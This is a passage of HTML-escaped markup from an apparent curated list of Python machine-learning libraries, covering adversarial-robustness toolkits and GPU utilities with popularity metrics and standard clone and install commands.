href=&#34;http://bit.ly/3hkKRql&#34;&gt;ISC&lt;/a&gt;&lt;/code&gt;&lt;/li&gt; &#xA;  &lt;li&gt;&lt;b&gt;&lt;a href=&#34;https://github.com/maximtrp/scikit-posthocs&#34;&gt;scikit-posthocs&lt;/a&gt;&lt;/b&gt; (🥉22 · ⭐ 240) - Multiple Pairwise Comparisons (Post Hoc) Tests in Python. &lt;code&gt;&lt;a href=&#34;http://bit.ly/34MBwT8&#34;&gt;MIT&lt;/a&gt;&lt;/code&gt; &lt;code&gt;&lt;img src=&#34;https://git.io/JLy1F&#34; style=&#34;display:inline;&#34; width=&#34;13&#34; height=&#34;13&#34;&gt;&lt;/code&gt;&lt;/li&gt; &#xA;  &lt;li&gt;&lt;b&gt;&lt;a href=&#34;https://github.com/mattjj/pyhsmm&#34;&gt;pyhsmm&lt;/a&gt;&lt;/b&gt; (🥉21 · ⭐ 510 · 💀) - Bayesian inference in HSMMs and HMMs. &lt;code&gt;&lt;a href=&#34;http://bit.ly/34MBwT8&#34;&gt;MIT&lt;/a&gt;&lt;/code&gt;&lt;/li&gt; &#xA;  &lt;li&gt;&lt;b&gt;&lt;a href=&#34;https://github.com/pyro-ppl/funsor&#34;&gt;Funsor&lt;/a&gt;&lt;/b&gt; (🥉20 · ⭐ 190) - Functional tensors for probabilistic programming. &lt;code&gt;&lt;a href=&#34;http://bit.ly/3nYMfla&#34;&gt;Apache-2&lt;/a&gt;&lt;/code&gt; &lt;code&gt;&lt;img src=&#34;https://git.io/JLy1Q&#34; style=&#34;display:inline;&#34; width=&#34;13&#34; height=&#34;13&#34;&gt;&lt;/code&gt;&lt;/li&gt; &#xA;  &lt;li&gt;&lt;b&gt;&lt;a href=&#34;https://github.com/thu-ml/zhusuan&#34;&gt;ZhuSuan&lt;/a&gt;&lt;/b&gt; (🥉15 · ⭐ 2.1K · 💀) - A probabilistic programming library for Bayesian deep learning,.. &lt;code&gt;&lt;a href=&#34;http://bit.ly/34MBwT8&#34;&gt;MIT&lt;/a&gt;&lt;/code&gt; &lt;code&gt;&lt;img src=&#34;https://git.io/JLy1A&#34; style=&#34;display:inline;&#34; width=&#34;13&#34; height=&#34;13&#34;&gt;&lt;/code&gt;&lt;/li&gt; &#xA; &lt;/ul&gt; &#xA;&lt;/details&gt; &#xA;&lt;br&gt; &#xA;&lt;h2&gt;Adversarial Robustness&lt;/h2&gt; &#xA;&lt;p&gt;&lt;a href=&#34;https://raw.githubusercontent.com/ml-tooling/best-of-ml-python/main/#contents&#34;&gt;&lt;img align=&#34;right&#34; width=&#34;15&#34; height=&#34;15&#34; src=&#34;https://git.io/JtehR&#34; alt=&#34;Back to top&#34;&gt;&lt;/a&gt;&lt;/p&gt; &#xA;&lt;p&gt;&lt;em&gt;Libraries for testing the robustness of machine learning models against attacks with adversarial/malicious examples.&lt;/em&gt;&lt;/p&gt; &#xA;&lt;details&gt;&#xA; &lt;summary&gt;&lt;b&gt;&lt;a href=&#34;https://github.com/Trusted-AI/adversarial-robustness-toolbox&#34;&gt;ART&lt;/a&gt;&lt;/b&gt; (🥇33 · ⭐ 3K · 📉) - Adversarial Robustness Toolbox (ART) - Python Library for Machine Learning.. &lt;code&gt;&lt;a href=&#34;http://bit.ly/34MBwT8&#34;&gt;MIT&lt;/a&gt;&lt;/code&gt;&lt;/summary&gt; &#xA; &lt;ul&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://github.com/Trusted-AI/adversarial-robustness-toolbox&#34;&gt;GitHub&lt;/a&gt; (👨‍💻 99 · 🔀 830 · 📦 220 · 📋 690 - 13% open · ⏱️ 25.05.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; git clone https://github.com/Trusted-AI/adversarial-robustness-toolbox&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://pypi.org/project/adversarial-robustness-toolbox&#34;&gt;PyPi&lt;/a&gt; (📥 7.1K / month · 📦 7 · ⏱️ 24.05.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; pip install adversarial-robustness-toolbox&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://anaconda.org/conda-forge/adversarial-robustness-toolbox&#34;&gt;Conda&lt;/a&gt; (📥 9.4K · ⏱️ 24.05.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; conda install -c conda-forge adversarial-robustness-toolbox&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA; &lt;/ul&gt; &#xA;&lt;/details&gt; &#xA;&lt;details&gt;&#xA; &lt;summary&gt;&lt;b&gt;&lt;a href=&#34;https://github.com/bethgelab/foolbox&#34;&gt;Foolbox&lt;/a&gt;&lt;/b&gt; (🥈30 · ⭐ 2.2K) - A Python toolbox to create adversarial examples that fool neural networks.. &lt;code&gt;&lt;a href=&#34;http://bit.ly/34MBwT8&#34;&gt;MIT&lt;/a&gt;&lt;/code&gt;&lt;/summary&gt; &#xA; &lt;ul&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://github.com/bethgelab/foolbox&#34;&gt;GitHub&lt;/a&gt; (👨‍💻 32 · 🔀 400 · 📦 290 · 📋 350 - 6% open · ⏱️ 25.05.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; git clone https://github.com/bethgelab/foolbox&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://pypi.org/project/foolbox&#34;&gt;PyPi&lt;/a&gt; (📥 2.7K / month · 📦 13 · ⏱️ 02.04.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; pip install foolbox&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://anaconda.org/conda-forge/foolbox&#34;&gt;Conda&lt;/a&gt; (📥 5.9K · ⏱️ 30.04.2021):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; conda install -c conda-forge foolbox&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA; &lt;/ul&gt; &#xA;&lt;/details&gt; &#xA;&lt;details&gt;&#xA; &lt;summary&gt;&lt;b&gt;&lt;a href=&#34;https://github.com/cleverhans-lab/cleverhans&#34;&gt;CleverHans&lt;/a&gt;&lt;/b&gt; (🥈29 · ⭐ 5.5K · 💤) - An adversarial example library for constructing attacks,.. &lt;code&gt;&lt;a href=&#34;http://bit.ly/34MBwT8&#34;&gt;MIT&lt;/a&gt;&lt;/code&gt; &lt;code&gt;&lt;img src=&#34;https://git.io/JLy1A&#34; style=&#34;display:inline;&#34; width=&#34;13&#34; height=&#34;13&#34;&gt;&lt;/code&gt;&lt;/summary&gt; &#xA; &lt;ul&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://github.com/cleverhans-lab/cleverhans&#34;&gt;GitHub&lt;/a&gt; (👨‍💻 130 · 🔀 1.3K · 📦 320 · 📋 450 - 5% open · ⏱️ 23.09.2021):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; git clone https://github.com/cleverhans-lab/cleverhans&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://pypi.org/project/cleverhans&#34;&gt;PyPi&lt;/a&gt; (📥 1.4K / month · 📦 11 · ⏱️ 24.07.2021):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; pip install cleverhans&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://anaconda.org/conda-forge/cleverhans&#34;&gt;Conda&lt;/a&gt; (📥 3K · ⏱️ 29.07.2021):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; conda install -c conda-forge cleverhans&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA; &lt;/ul&gt; &#xA;&lt;/details&gt; &#xA;&lt;details&gt;&#xA; &lt;summary&gt;&lt;b&gt;&lt;a href=&#34;https://github.com/QData/TextAttack&#34;&gt;TextAttack&lt;/a&gt;&lt;/b&gt; (🥈29 · ⭐ 2K) - TextAttack is a Python framework for adversarial attacks, data.. &lt;code&gt;&lt;a href=&#34;http://bit.ly/34MBwT8&#34;&gt;MIT&lt;/a&gt;&lt;/code&gt;&lt;/summary&gt; &#xA; &lt;ul&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://github.com/QData/TextAttack&#34;&gt;GitHub&lt;/a&gt; (👨‍💻 51 · 🔀 250 · 📦 78 · 📋 200 - 20% open · ⏱️ 25.05.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; git clone https://github.com/QData/TextAttack&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://pypi.org/project/textattack&#34;&gt;PyPi&lt;/a&gt; (📥 2.2K / month · 📦 7 · ⏱️ 25.05.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; pip install textattack&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://anaconda.org/conda-forge/textattack&#34;&gt;Conda&lt;/a&gt; (📥 2.8K · ⏱️ 29.06.2021):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; conda install -c conda-forge textattack&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA; &lt;/ul&gt; &#xA;&lt;/details&gt; &#xA;&lt;details&gt;&#xA; &lt;summary&gt;&lt;b&gt;&lt;a href=&#34;https://github.com/MadryLab/robustness&#34;&gt;robustness&lt;/a&gt;&lt;/b&gt; (🥉19 · ⭐ 700) - A library for experimenting with, training and evaluating neural.. &lt;code&gt;&lt;a href=&#34;http://bit.ly/34MBwT8&#34;&gt;MIT&lt;/a&gt;&lt;/code&gt;&lt;/summary&gt; &#xA; &lt;ul&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://github.com/MadryLab/robustness&#34;&gt;GitHub&lt;/a&gt; (👨‍💻 13 · 🔀 140 · 📦 77 · 📋 74 - 24% open · ⏱️ 14.02.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; git clone https://github.com/MadryLab/robustness&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://pypi.org/project/robustness&#34;&gt;PyPi&lt;/a&gt; (📥 1.1K / month · 📦 2 · ⏱️ 01.12.2020):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; pip install robustness&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://anaconda.org/conda-forge/robustness&#34;&gt;Conda&lt;/a&gt; (📥 3.5K · ⏱️ 30.04.2021):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; conda install -c conda-forge robustness&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA; &lt;/ul&gt; &#xA;&lt;/details&gt; &#xA;&lt;details&gt;&#xA; &lt;summary&gt;&lt;b&gt;&lt;a href=&#34;https://github.com/advboxes/AdvBox&#34;&gt;AdvBox&lt;/a&gt;&lt;/b&gt; (🥉18 · ⭐ 1.2K) - Advbox is a toolbox to generate adversarial examples that fool neural.. &lt;code&gt;&lt;a href=&#34;http://bit.ly/3nYMfla&#34;&gt;Apache-2&lt;/a&gt;&lt;/code&gt;&lt;/summary&gt; &#xA; &lt;ul&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://github.com/advboxes/AdvBox&#34;&gt;GitHub&lt;/a&gt; (👨‍💻 19 · 🔀 240 · 📋 38 - 21% open · ⏱️ 15.05.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; git clone https://github.com/advboxes/AdvBox&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://pypi.org/project/advbox&#34;&gt;PyPi&lt;/a&gt; (📥 21 / month · ⏱️ 05.12.2018):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; pip install advbox&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA; &lt;/ul&gt; &#xA;&lt;/details&gt; &#xA;&lt;details&gt;&#xA; &lt;summary&gt;Show 3 hidden projects...&lt;/summary&gt; &#xA; &lt;ul&gt; &#xA;  &lt;li&gt;&lt;b&gt;&lt;a href=&#34;https://github.com/BorealisAI/advertorch&#34;&gt;advertorch&lt;/a&gt;&lt;/b&gt; (🥉23 · ⭐ 1.1K) - A Toolbox for Adversarial Robustness Research. &lt;code&gt;&lt;a href=&#34;http://bit.ly/2M0xdwT&#34;&gt;❗️GPL-3.0&lt;/a&gt;&lt;/code&gt; &lt;code&gt;&lt;img src=&#34;https://git.io/JLy1Q&#34; style=&#34;display:inline;&#34; width=&#34;13&#34; height=&#34;13&#34;&gt;&lt;/code&gt;&lt;/li&gt; &#xA;  &lt;li&gt;&lt;b&gt;&lt;a href=&#34;https://github.com/textflint/textflint&#34;&gt;textflint&lt;/a&gt;&lt;/b&gt; (🥉17 · ⭐ 560) - Unified Multilingual Robustness Evaluation Toolkit for Natural.. &lt;code&gt;&lt;a href=&#34;http://bit.ly/2M0xdwT&#34;&gt;❗️GPL-3.0&lt;/a&gt;&lt;/code&gt;&lt;/li&gt; &#xA;  &lt;li&gt;&lt;b&gt;&lt;a href=&#34;https://github.com/airbnb/artificial-adversary&#34;&gt;Adversary&lt;/a&gt;&lt;/b&gt; (🥉14 · ⭐ 360 · 💀) - Tool to generate adversarial text examples and test machine.. &lt;code&gt;&lt;a href=&#34;http://bit.ly/34MBwT8&#34;&gt;MIT&lt;/a&gt;&lt;/code&gt;&lt;/li&gt; &#xA; &lt;/ul&gt; &#xA;&lt;/details&gt; &#xA;&lt;br&gt; &#xA;&lt;h2&gt;GPU Utilities&lt;/h2&gt; &#xA;&lt;p&gt;&lt;a href=&#34;https://raw.githubusercontent.com/ml-tooling/best-of-ml-python/main/#contents&#34;&gt;&lt;img align=&#34;right&#34; width=&#34;15&#34; height=&#34;15&#34; src=&#34;https://git.io/JtehR&#34; alt=&#34;Back to top&#34;&gt;&lt;/a&gt;&lt;/p&gt; &#xA;&lt;p&gt;&lt;em&gt;Libraries that require and make use of CUDA/GPU system capabilities to optimize data handling and machine learning tasks.&lt;/em&gt;&lt;/p&gt; &#xA;&lt;details&gt;&#xA; &lt;summary&gt;&lt;b&gt;&lt;a href=&#34;https://github.com/cupy/cupy&#34;&gt;CuPy&lt;/a&gt;&lt;/b&gt; (🥇38 · ⭐ 6K) - NumPy &amp;amp; SciPy for GPU. &lt;code&gt;&lt;a href=&#34;http://bit.ly/34MBwT8&#34;&gt;MIT&lt;/a&gt;&lt;/code&gt;&lt;/summary&gt; &#xA; &lt;ul&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://github.com/cupy/cupy&#34;&gt;GitHub&lt;/a&gt; (👨‍💻 300 · 🔀 600 · 📥 31K · 📦 1K · 📋 1.8K - 22% open · ⏱️ 26.05.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; git clone https://github.com/cupy/cupy&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://pypi.org/project/cupy&#34;&gt;PyPi&lt;/a&gt; (📥 26K / month · 📦 160 · ⏱️ 26.05.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; pip install cupy&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://anaconda.org/conda-forge/cupy&#34;&gt;Conda&lt;/a&gt; (📥 1.4M · ⏱️ 04.05.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; conda install -c conda-forge cupy&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://hub.docker.com/r/cupy/cupy&#34;&gt;Docker Hub&lt;/a&gt; (📥 55K · ⭐ 7 · ⏱️ 26.05.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; docker pull cupy/cupy&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA; &lt;/ul&gt; &#xA;&lt;/details&gt; &#xA;&lt;details&gt;&#xA; &lt;summary&gt;&lt;b&gt;&lt;a href=&#34;https://github.com/rapidsai/cudf&#34;&gt;cuDF&lt;/a&gt;&lt;/b&gt; (🥇31 · ⭐ 4.8K) - cuDF - GPU DataFrame Library. &lt;code&gt;&lt;a href=&#34;http://bit.ly/3nYMfla&#34;&gt;Apache-2&lt;/a&gt;&lt;/code&gt;&lt;/summary&gt; &#xA; &lt;ul&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://github.com/rapidsai/cudf&#34;&gt;GitHub&lt;/a&gt; (👨‍💻 240 · 🔀 600 · 📋 4.6K - 15% open · ⏱️ 25.05.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; git clone https://github.com/rapidsai/cudf&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://pypi.org/project/cudf&#34;&gt;PyPi&lt;/a&gt; (📥 1.5K / month · 📦 5 · ⏱️ 01.06.2020):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; pip install cudf&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA; &lt;/ul&gt; &#xA;&lt;/details&gt; &#xA;&lt;details&gt;&#xA; &lt;summary&gt;&lt;b&gt;&lt;a href=&#34;https://github.com/arrayfire/arrayfire&#34;&gt;ArrayFire&lt;/a&gt;&lt;/b&gt; (🥈29 · ⭐ 3.8K · 📉) - ArrayFire: a general purpose GPU library. &lt;code&gt;&lt;a href=&#34;http://bit.ly/3aKzpTv&#34;&gt;BSD-3&lt;/a&gt;&lt;/code&gt;&lt;/summary&gt; &#xA; &lt;ul&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://github.com/arrayfire/arrayfire&#34;&gt;GitHub&lt;/a&gt; (👨‍💻 81 · 🔀 490 · 📥 2.4K · 📋 1.5K - 15% open · ⏱️ 12.05.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; git clone https://github.com/arrayfire/arrayfire&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://pypi.org/project/arrayfire&#34;&gt;PyPi&lt;/a&gt; (📥 7K / month · 📦 5 · ⏱️ 22.02.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; pip install arrayfire&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA; &lt;/ul&gt; &#xA;&lt;/details&gt; &#xA;&lt;details&gt;&#xA; &lt;summary&gt;&lt;b&gt;&lt;a href=&#34;https://github.com/wookayin/gpustat&#34;&gt;gpustat&lt;/a&gt;&lt;/b&gt; (🥈29 · ⭐ 2.9K) - A simple command-line utility for querying and monitoring GPU status. &lt;code&gt;&lt;a href=&#34;http://bit.ly/34MBwT8&#34;&gt;MIT&lt;/a&gt;&lt;/code&gt;&lt;/summary&gt; &#xA; &lt;ul&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://github.com/wookayin/gpustat&#34;&gt;GitHub&lt;/a&gt; (👨‍💻 12 · 🔀 220 · 📦 1.9K · 📋 82 - 28% open · ⏱️ 07.11.2021):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; git clone https://github.com/wookayin/gpustat&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://pypi.org/project/gpustat&#34;&gt;PyPi&lt;/a&gt; (📥 620K / month · 📦 99 · ⏱️ 02.01.2021):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; pip install gpustat&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://anaconda.org/conda-forge/gpustat&#34;&gt;Conda&lt;/a&gt; (📥 130K · ⏱️ 24.11.2020):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; conda install -c conda-forge gpustat&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA; &lt;/ul&gt; &#xA;&lt;/details&gt; &#xA;&lt;details&gt;&#xA; &lt;summary&gt;&lt;b&gt;&lt;a href=&#34;https://github.com/rapidsai/cuml&#34;&gt;cuML&lt;/a&gt;&lt;/b&gt; (🥈29 · ⭐ 2.7K) - cuML - RAPIDS Machine Learning Library. &lt;code&gt;&lt;a href=&#34;http://bit.ly/3nYMfla&#34;&gt;Apache-2&lt;/a&gt;&lt;/code&gt;&lt;/summary&gt; &#xA; &lt;ul&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://github.com/rapidsai/cuml&#34;&gt;GitHub&lt;/a&gt; (👨‍💻 150 · 🔀 400 · 📋 2K - 33% open · ⏱️ 24.05.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; git clone https://github.com/rapidsai/cuml&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://pypi.org/project/cuml&#34;&gt;PyPi&lt;/a&gt; (📥 770 / month · 📦 3 · ⏱️ 01.06.2020):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; pip install cuml&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA; &lt;/ul&gt; &#xA;&lt;/details&gt; &#xA;&lt;details&gt;&#xA; &lt;summary&gt;&lt;b&gt;&lt;a href=&#34;https://github.com/inducer/pycuda&#34;&gt;PyCUDA&lt;/a&gt;&lt;/b&gt; (🥈29 · ⭐ 1.3K) - CUDA integration for Python, plus shiny features. &lt;code&gt;&lt;a href=&#34;http://bit.ly/34MBwT8&#34;&gt;MIT&lt;/a&gt;&lt;/code&gt;&lt;/summary&gt; &#xA; &lt;ul&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://github.com/inducer/pycuda&#34;&gt;GitHub&lt;/a&gt; (👨‍💻 75 · 🔀 250 · 📦 1.3K · 📋 220 - 29% open · ⏱️ 03.03.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; git clone https://github.com/inducer/pycuda&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://pypi.org/project/pycuda&#34;&gt;PyPi&lt;/a&gt; (📥 30K / month · 📦 190 · ⏱️ 03.04.2021):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; pip install pycuda&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://anaconda.org/conda-forge/pycuda&#34;&gt;Conda&lt;/a&gt; (📥 67K · ⏱️ 05.05.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; conda install -c conda-forge pycuda&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA; &lt;/ul&gt; &#xA;&lt;/details&gt; &#xA;&lt;details&gt;&#xA; &lt;summary&gt;&lt;b&gt;&lt;a href=&#34;https://github.com/NVIDIA/apex&#34;&gt;Apex&lt;/a&gt;&lt;/b&gt; (🥈28 · ⭐ 6.4K) - A PyTorch Extension: Tools for easy mixed precision and distributed.. &lt;code&gt;&lt;a href=&#34;http://bit.ly/3aKzpTv&#34;&gt;BSD-3&lt;/a&gt;&lt;/code&gt; &lt;code&gt;&lt;img src=&#34;https://git.io/JLy1Q&#34; style=&#34;display:inline;&#34; width=&#34;13&#34; height=&#34;13&#34;&gt;&lt;/code&gt;&lt;/summary&gt; &#xA; &lt;ul&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://github.com/NVIDIA/apex&#34;&gt;GitHub&lt;/a&gt; (👨‍💻 93 · 🔀 1K · 📦 1K · 📋 1K - 58% open · ⏱️ 20.05.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; git clone https://github.com/NVIDIA/apex&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://anaconda.org/conda-forge/nvidia-apex&#34;&gt;Conda&lt;/a&gt; (📥 84K · ⏱️ 06.04.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; conda install -c conda-forge nvidia-apex&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA; &lt;/ul&gt; &#xA;&lt;/details&gt; &#xA;&lt;details&gt;&#xA; &lt;summary&gt;&lt;b&gt;&lt;a href=&#34;https://github.com/NVIDIA/DALI&#34;&gt;DALI&lt;/a&gt;&lt;/b&gt; (🥉24 · ⭐ 3.9K) - A GPU-accelerated library containing highly optimized building blocks.. &lt;code&gt;&lt;a href=&#34;http://bit.ly/3nYMfla&#34;&gt;Apache-2&lt;/a&gt;&lt;/code&gt;&lt;/summary&gt; &#xA; &lt;ul&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://github.com/NVIDIA/DALI&#34;&gt;GitHub&lt;/a&gt; (👨‍💻 74 · 🔀 500 · 📋 1.2K - 16% open · ⏱️ 26.05.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; git clone https://github.com/NVIDIA/DALI&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA; &lt;/ul&gt; &#xA;&lt;/details&gt; &#xA;&lt;details&gt;&#xA; &lt;summary&gt;&lt;b&gt;&lt;a href=&#34;https://github.com/rapidsai/cugraph&#34;&gt;cuGraph&lt;/a&gt;&lt;/b&gt; (🥉24 · ⭐ 1K) - cuGraph - RAPIDS Graph Analytics Library. &lt;code&gt;&lt;a href=&#34;http://bit.ly/3nYMfla&#34;&gt;Apache-2&lt;/a&gt;&lt;/code&gt;&lt;/summary&gt; &#xA; &lt;ul&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://github.com/rapidsai/cugraph&#34;&gt;GitHub&lt;/a&gt; (👨‍💻 85 · 🔀 190 · 📋 820 - 12% open · ⏱️ 25.05.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; git clone https://github.com/rapidsai/cugraph&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://pypi.org/project/cugraph&#34;&gt;PyPi&lt;/a&gt; (📥 210 / month · 📦 1 · ⏱️ 01.06.2020):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; pip install cugraph&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://anaconda.org/conda-forge/libcugraph&#34;&gt;Conda&lt;/a&gt; (📥 6.9K · ⏱️ 29.04.2021):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; conda install -c conda-forge libcugraph&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA; &lt;/ul&gt; &#xA;&lt;/details&gt; &#xA;&lt;details&gt;&#xA; &lt;summary&gt;&lt;b&gt;&lt;a href=&#34;https://github.com/lebedov/scikit-cuda&#34;&gt;scikit-cuda&lt;/a&gt;&lt;/b&gt; (🥉24 · ⭐ 890) - Python interface to GPU-powered libraries. &lt;code&gt;&lt;a href=&#34;http://bit.ly/3aKzpTv&#34;&gt;BSD-3&lt;/a&gt;&lt;/code&gt;&lt;/summary&gt; &#xA; &lt;ul&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://github.com/lebedov/scikit-cuda&#34;&gt;GitHub&lt;/a&gt; (👨‍💻 46 · 🔀 170 · 📦 190 · 📋 220 - 22% open · ⏱️ 31.03.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; git clone https://github.com/lebedov/scikit-cuda&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://pypi.org/project/scikit-cuda&#34;&gt;PyPi&lt;/a&gt; (📥 650 / month · 📦 44 · ⏱️ 27.05.2019):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; pip install scikit-cuda&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA; &lt;/ul&gt; &#xA;&lt;/details&gt; &#xA;&lt;details&gt;&#xA; &lt;summary&gt;&lt;b&gt;&lt;a href=&#34;https://github.com/BlazingDB/blazingsql&#34;&gt;BlazingSQL&lt;/a&gt;&lt;/b&gt; (🥉22 · ⭐ 1.8K · 💤) - BlazingSQL is a lightweight, GPU accelerated, SQL engine for.. &lt;code&gt;&lt;a href=&#34;http://bit.ly/3nYMfla&#34;&gt;Apache-2&lt;/a&gt;&lt;/code&gt;&lt;/summary&gt; &#xA; &lt;ul&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://github.com/BlazingDB/blazingsql&#34;&gt;GitHub&lt;/a&gt; (👨‍💻 49 · 🔀 170 · 📋 720 - 18% open · 